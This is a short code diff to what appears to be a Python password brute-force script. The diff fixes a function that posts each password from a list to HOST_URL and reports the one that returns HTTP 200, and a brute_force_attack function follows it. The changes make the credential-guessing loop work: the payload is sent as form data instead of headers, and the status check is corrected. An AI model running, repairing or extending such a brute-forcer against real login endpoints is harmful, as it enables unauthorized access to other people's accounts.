@@ -16,16 +16,16 @@ def send_password(password_list:list):
             }
           
           #response = requests.post(HOST_URL,headers=payload)
-          response = requests.post(HOST_URL,headers=payload)
+          response = requests.post(HOST_URL,data=payload)
           response.raise_for_status()  # Raise an exception for unsuccessful requests
 
           # Access data if successful
           print(response.text)
         except requests.exceptions.RequestException as e:
           print(f"An error occurred: {e}")
-        if(response.status):
-          print("Password:" + i)
-          return True, i     
+        if(response.status_code == 200):
+          print("Password:" + str(i))
+          return True, str(i)     
     return False, ""
         
 def brute_force_attack():
